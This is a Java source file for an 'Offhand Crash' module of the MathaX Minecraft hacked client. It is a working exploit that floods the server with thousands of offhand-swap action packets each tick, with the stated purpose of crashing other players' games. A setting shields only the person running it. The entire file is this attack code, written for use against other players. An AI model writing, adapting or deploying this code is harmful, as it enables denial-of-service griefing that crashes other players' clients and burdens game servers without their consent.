package xyz.mathax.mathaxclient.systems.modules.misc;

import io.netty.channel.Channel;
import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import xyz.mathax.mathaxclient.eventbus.EventHandler;
import xyz.mathax.mathaxclient.events.world.TickEvent;
import xyz.mathax.mathaxclient.mixin.ClientConnectionAccessor;
import xyz.mathax.mathaxclient.settings.BoolSetting;
import xyz.mathax.mathaxclient.settings.IntSetting;
import xyz.mathax.mathaxclient.settings.Setting;
import xyz.mathax.mathaxclient.settings.SettingGroup;
import xyz.mathax.mathaxclient.systems.modules.Category;
import xyz.mathax.mathaxclient.systems.modules.Module;

public class OffhandCrash extends Module {
    private static final PlayerActionC2SPacket PACKET = new PlayerActionC2SPacket(PlayerActionC2SPacket.Action.SWAP_ITEM_WITH_OFFHAND, new BlockPos(0, 0, 0) , Direction.UP);

    private final SettingGroup generalSettings = settings.createGroup("General");

    // General

    private final Setting<Boolean> doCrashSetting = generalSettings.add(new BoolSetting.Builder()
            .name("Do crash")
            .description("Send X number of offhand swap sound packets to the server per tick.")
            .defaultValue(true)
            .build()
    );

    private final Setting<Integer> speedSetting = generalSettings.add(new IntSetting.Builder()
            .name("Speed")
            .description("The amount of swaps measured in ticks.")
            .defaultValue(2000)
            .min(1)
            .sliderRange(1, 10000)
            .visible(doCrashSetting::get)
            .build()
    );

    private final Setting<Boolean> antiCrash = generalSettings.add(new BoolSetting.Builder()
            .name("Prevent crash")
            .description("Attempt to prevent you from crashing yourself.")
            .defaultValue(true)
            .build()
    );

    public OffhandCrash(Category category) {
        super(category, "Offhand Crash", "An exploit that can crash other players by swapping back and forth between your main hand and offhand.");
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (doCrashSetting.get()) {
            Channel channel = ((ClientConnectionAccessor) mc.player.networkHandler.getConnection()).getChannel();
            for (int i = 0; i < speedSetting.get(); ++i) {
                channel.write(PACKET);
            }

            channel.flush();
        }
    }

    public boolean isAntiCrash() {
        return isEnabled() && antiCrash.get();
    }
}